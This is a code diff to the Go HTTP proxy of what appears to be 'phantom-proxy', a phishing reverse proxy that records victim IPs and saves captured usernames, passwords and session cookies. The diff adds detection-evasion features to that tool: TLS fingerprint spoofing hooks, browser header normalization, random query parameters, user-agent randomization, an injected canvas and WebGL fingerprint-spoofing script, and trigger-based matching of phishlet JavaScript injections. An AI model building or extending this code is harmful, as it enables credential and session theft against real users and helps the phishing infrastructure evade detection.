@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/http/httputil"
@@ -29,6 +30,12 @@ import (
 	"github.com/phantom-proxy/phantom-proxy/internal/websocket"
 )
 
+// TLSDialer is an abstraction for establishing TLS connections.  Implementations
+// may spoof fingerprints (e.g. via utls) or just dial normally.
+type TLSDialer interface {
+	Dial(network, addr string) (net.Conn, error)
+}
+
 // HTTPProxy основной HTTP/HTTPS прокси
 type HTTPProxy struct {
 	mu           sync.RWMutex
@@ -37,6 +44,9 @@ type HTTPProxy struct {
 	logger       *zap.Logger
 	server       *http.Server
 	tlsConfig    *tls.Config
+	// optional TLS dialer used when outbound connections are made.  nil means
+	// use default tls.Dial.
+	tlsManager   TLSDialer
 	wsProxy      *websocket.Proxy
 	swInjector   *serviceworker.Injector
 	polyEngine   *polymorphic.Engine
@@ -46,6 +56,8 @@ type HTTPProxy struct {
 	phishlets    map[string]*Phishlet
 	reverseProxy *httputil.ReverseProxy
 	eventBus     *events.Bus
+	// rng for various random operations
+	rand         *rand.Rand
 }
 
 // ProxySession представляет прокси-сессию
@@ -60,6 +72,7 @@ type ProxySession struct {
 	Credentials  *database.Credentials
 	Cookies      []*http.Cookie
 	RequestCount int64
+	UserAgent    string // recorded or spoofed user agent
 }
 
 // Phishlet конфигурация для целевого сервиса
@@ -74,6 +87,7 @@ type Phishlet struct {
 	AuthURLs     []string      `yaml:"auth_urls"`
 	Login        LoginConfig   `yaml:"login"`
 	JSInjections []JSInjection `yaml:"js_inject"`
+	Enabled      bool          `yaml:"enabled"`
 }
 
 type ProxyHost struct {
@@ -126,7 +140,7 @@ type JSInjection struct {
 }
 
 // NewHTTPProxy создаёт новый HTTP прокси
-func NewHTTPProxy(cfg *config.Config, db *database.Database, logger *zap.Logger) (*HTTPProxy, error) {
+func NewHTTPProxy(cfg *config.Config, db *database.Database, tlsManager TLSDialer, logger *zap.Logger) (*HTTPProxy, error) {
 	// Загрузка TLS сертификатов
 	tlsConfig, err := loadTLSConfig(cfg.CertPath, cfg.KeyPath)
 	if err != nil {
@@ -138,11 +152,13 @@ func NewHTTPProxy(cfg *config.Config, db *database.Database, logger *zap.Logger)
 		db:           db,
 		logger:       logger,
 		tlsConfig:    tlsConfig,
+		tlsManager:   tlsManager,
 		sessions:     make(map[string]*ProxySession),
 		sessionIndex: make(map[string]string),
 		phishlets:    make(map[string]*Phishlet),
 		wsProxy:      websocket.NewProxy(logger),
 		swInjector:   serviceworker.NewInjector(fmt.Sprintf("https://%s", cfg.Domain), "redirect"),
+		rand:          rand.New(rand.NewSource(time.Now().UnixNano())),
 	}
 
 	// Загрузка phishlets
@@ -173,6 +189,13 @@ func NewHTTPProxy(cfg *config.Config, db *database.Database, logger *zap.Logger)
 
 // loadTLSConfig загружает TLS сертификаты
 func loadTLSConfig(certFile, keyFile string) (*tls.Config, error) {
+	if certFile == "" || keyFile == "" {
+		// tests or fallback may pass empty paths; return minimal config
+		return &tls.Config{
+			MinVersion: tls.VersionTLS12,
+		}, nil
+	}
+
 	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
 	if err != nil {
 		return nil, err
@@ -189,10 +212,12 @@ func loadTLSConfig(certFile, keyFile string) (*tls.Config, error) {
 func (p *HTTPProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	start := time.Now()
 
-	// Обработка Service Worker
-	if strings.HasPrefix(r.URL.Path, "/sw.js") || strings.HasPrefix(r.URL.Path, "/phantom.js") {
-		p.swInjector.HandleSWRequest(w, r)
-		return
+	// Обработка Service Worker (только если включено в конфиг)
+	if cfg := p.cfg; cfg != nil && cfg.ServiceWorkerEnabled {
+		if strings.HasPrefix(r.URL.Path, "/sw.js") || strings.HasPrefix(r.URL.Path, "/phantom.js") {
+			p.swInjector.HandleSWRequest(w, r)
+			return
+		}
 	}
 
 	// Обработка CORS preflight OPTIONS запросов
@@ -511,6 +536,23 @@ func (p *HTTPProxy) director(req *http.Request) {
 		}
 	}
 
+	// Normalize headers to look more like a real browser
+	if cfg := p.cfg; cfg != nil && cfg.NormalizeHeaders {
+		normalizeHeaders(req)
+	}
+
+	// Polymorphic mode: add random query param to avoid simple fingerprinting
+	if cfg := p.cfg; cfg != nil && cfg.PolymorphicEnabled {
+		q := req.URL.Query()
+		q.Set("__phantom", uuid.New().String())
+		req.URL.RawQuery = q.Encode()
+	}
+
+	// Set User-Agent based on session (may have been randomized)
+	if session != nil && session.UserAgent != "" {
+		req.Header.Set("User-Agent", session.UserAgent)
+	}
+
 	// Замена Referer
 	if referer := req.Referer(); referer != "" {
 		req.Header.Set("Referer", p.replaceDomain(referer, session))
@@ -566,7 +608,7 @@ func (p *HTTPProxy) modifyResponse(resp *http.Response) error {
 
 		// Инъекция JavaScript в HTML
 		if strings.Contains(contentType, "text/html") {
-			modifiedBody = p.injectJavaScript(modifiedBody, session)
+			modifiedBody = p.injectJavaScript(modifiedBody, session, resp.Request)
 
 			// Инъекция Service Worker
 			if p.cfg.ServiceWorkerEnabled {
@@ -618,7 +660,7 @@ func (p *HTTPProxy) applySubFilters(body []byte, session *ProxySession) []byte {
 }
 
 // injectJavaScript внедряет JavaScript в HTML
-func (p *HTTPProxy) injectJavaScript(body []byte, session *ProxySession) []byte {
+func (p *HTTPProxy) injectJavaScript(body []byte, session *ProxySession, req *http.Request) []byte {
 	bodyTag := []byte("</body>")
 	idx := bytes.LastIndex(body, bodyTag)
 
@@ -626,7 +668,11 @@ func (p *HTTPProxy) injectJavaScript(body []byte, session *ProxySession) []byte 
 		return body
 	}
 
-	script := p.generateScript(session)
+	script := p.generateScript(session, req)
+	if script == "" {
+		// no injections matched
+		return body
+	}
 
 	result := make([]byte, len(body)+len(script))
 	copy(result, body[:idx])
@@ -636,20 +682,106 @@ func (p *HTTPProxy) injectJavaScript(body []byte, session *ProxySession) []byte 
 	return result
 }
 
-// generateScript генерирует JavaScript для инъекции
-func (p *HTTPProxy) generateScript(session *ProxySession) string {
-	script := `<script id="phantom-inject">`
+// canvasSpoofScript is a small snippet that overrides canvas methods
+// to return a constant image, preventing fingerprinting.
+const canvasSpoofScript = `(function(){
+    const original = HTMLCanvasElement.prototype.toDataURL;
+    HTMLCanvasElement.prototype.toDataURL = function() {
+        try {
+            return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAA';
+        } catch(e) { return original.apply(this, arguments); }
+    };
 
-	if session.PhishletID != "" {
+    // simple WebGL fingerprint spoof: stub out getParameter
+    if (window.WebGLRenderingContext) {
+        const origGetParameter = WebGLRenderingContext.prototype.getParameter;
+        WebGLRenderingContext.prototype.getParameter = function(param) {
+            // return constant value for common queries
+            if (param === 37445 || param === 37446) { // VENDOR, RENDERER
+                return 'WebKit';
+            }
+            return origGetParameter.apply(this, arguments);
+        };
+    }
+})();`
+
+// generateScript генерирует JavaScript для инъекции на основе условий и
+// опциональных анти-детект флагов.
+func (p *HTTPProxy) generateScript(session *ProxySession, req *http.Request) string {
+	parts := []string{}
+
+	// anti-detect canvas spoofing
+	if cfg := p.cfg; cfg != nil && cfg.CanvasSpoofEnabled {
+		parts = append(parts, canvasSpoofScript)
+	}
+
+	// phishlet-specific injections
+	if session != nil && session.PhishletID != "" {
 		if phishlet, ok := p.phishlets[session.PhishletID]; ok {
 			for _, inj := range phishlet.JSInjections {
-				script += inj.Script
+				if injectionMatches(inj, req) {
+					parts = append(parts, inj.Script)
+				}
 			}
 		}
 	}
 
-	script += `</script>`
+	if len(parts) == 0 {
+		return ""
+	}
+
+	script := `<script id="phantom-inject">` + strings.Join(parts, "") + `</script>`
 	return script
+}
+
+// injectionMatches проверяет, должен ли инъекция применяться к текущему запросу
+func injectionMatches(inj JSInjection, req *http.Request) bool {
+	// domain trigger
+	if len(inj.TriggerDomains) > 0 {
+		host := req.Host
+		matched := false
+		for _, d := range inj.TriggerDomains {
+			if strings.Contains(host, d) {
+				matched = true
+				break
+			}
+		}
+		if !matched {
+			return false
+		}
+	}
+
+	// path trigger
+	if len(inj.TriggerPaths) > 0 {
+		path := req.URL.Path
+		matched := false
+		for _, p := range inj.TriggerPaths {
+			if strings.Contains(path, p) {
+				matched = true
+				break
+			}
+		}
+		if !matched {
+			return false
+		}
+	}
+
+	// params trigger
+	if len(inj.TriggerParams) > 0 {
+		q := req.URL.Query()
+		matched := false
+		for _, p := range inj.TriggerParams {
+			if _, ok := q[p]; ok {
+				matched = true
+				break
+			}
+		}
+		if !matched {
+			return false
+		}
+	}
+
+	return true
 }
 
 // shouldModifyContent проверяет, нужно ли модифицировать контент
@@ -685,6 +817,10 @@ func (p *HTTPProxy) getPhishDomain(original string, session *ProxySession) strin
 func (p *HTTPProxy) createTransport() *http.Transport {
 	return &http.Transport{
 		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+			if p.tlsManager != nil {
+				// let spoofing manager handle connection (will apply selected profile)
+				return p.tlsManager.Dial(network, addr)
+			}
 			config := &tls.Config{
 				ServerName: getServerName(addr),
 				MinVersion: tls.VersionTLS12,
@@ -703,6 +839,22 @@ func (p *HTTPProxy) createTransport() *http.Transport {
 func getServerName(addr string) string {
 	host, _, _ := net.SplitHostPort(addr)
 	return host
+}
+
+// normalizeHeaders ensures the request contains typical browser headers
+func normalizeHeaders(req *http.Request) {
+	if req.Header.Get("Accept-Language") == "" {
+		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+	}
+	if req.Header.Get("Accept-Encoding") == "" {
+		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	}
+	if req.Header.Get("Accept") == "" {
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	}
+	if req.Header.Get("Connection") == "" {
+		req.Header.Set("Connection", "keep-alive")
+	}
 }
 
 // getOrCreateSession получает или создаёт сессию
@@ -737,15 +889,25 @@ func (p *HTTPProxy) createSession(clientIP string, r *http.Request) *ProxySessio
 
 	targetHost := p.determineTargetHost(r)
 
+	// determine user agent value (may be randomized)
+	rawUA := r.UserAgent()
+	ua := rawUA
+	if cfg := p.cfg; cfg != nil && cfg.RandomizeUserAgent && len(cfg.UserAgents) > 0 {
+		ua = cfg.UserAgents[p.rand.Intn(len(cfg.UserAgents))]
+		p.logger.Debug("User agent randomized", zap.String("ua", ua))
+	}
+
 	dbSession := &database.Session{
 		ID:         id,
 		VictimIP:   clientIP,
 		TargetURL:  targetHost,
-		UserAgent:  r.UserAgent(),
+		UserAgent:  ua,
 		State:      "active",
 	}
-	if err := p.db.CreateSession(dbSession); err != nil {
-		p.logger.Error("Failed to create session in DB", zap.Error(err))
+	if p.db != nil {
+		if err := p.db.CreateSession(dbSession); err != nil {
+			p.logger.Error("Failed to create session in DB", zap.Error(err))
+		}
 	}
 
 	session := &ProxySession{
@@ -755,6 +917,7 @@ func (p *HTTPProxy) createSession(clientIP string, r *http.Request) *ProxySessio
 		CreatedAt:  time.Now(),
 		LastActive: time.Now(),
 		Cookies:    make([]*http.Cookie, 0),
+		UserAgent:  ua,
 	}
 
 	p.logger.Info("New session created",
@@ -896,8 +1059,10 @@ func (p *HTTPProxy) SaveCredentials(sessionID, username, password string) error 
 		Username:  username,
 		Password:  password,
 	}
-	if err := p.db.CreateCredentials(creds); err != nil {
-		return err
+	if p.db != nil {
+		if err := p.db.CreateCredentials(creds); err != nil {
+			return err
+		}
 	}
 
 	session.Credentials = creds
@@ -924,7 +1089,7 @@ func (p *HTTPProxy) SaveCredentials(sessionID, username, password string) error 
 			SessionID:  sessionID,
 			VictimIP:   session.VictimIP,
 			TargetURL:  targetURL,
-			UserAgent:  "",
+			UserAgent:  session.UserAgent,
 			PhishletID: session.PhishletID,
 			State:      "captured",
 			Timestamp:  time.Now(),
@@ -951,8 +1116,10 @@ func (p *HTTPProxy) AddCookie(sessionID, name, value, domain, path string, expir
 		HTTPOnly:  httpOnly,
 		Secure:    secure,
 	}
-	if err := p.db.CreateCookie(cookie); err != nil {
-		return err
+	if p.db != nil {
+		if err := p.db.CreateCookie(cookie); err != nil {
+			return err
+		}
 	}
 
 	session.Cookies = append(session.Cookies, &http.Cookie{
@@ -1082,4 +1249,12 @@ func (p *HTTPProxy) SetPolymorphicEngine(e *polymorphic.Engine) {
 // SetBotDetector sets ML bot detector
 func (p *HTTPProxy) SetBotDetector(d *ml.BotDetector) {
 	p.botDetector = d
+}
+
+// Close gracefully shuts down the HTTP proxy (used by tests / shutdown logic)
+func (p *HTTPProxy) Close() error {
+	if p.server != nil {
+		return p.server.Close()
+	}
+	return nil
 }
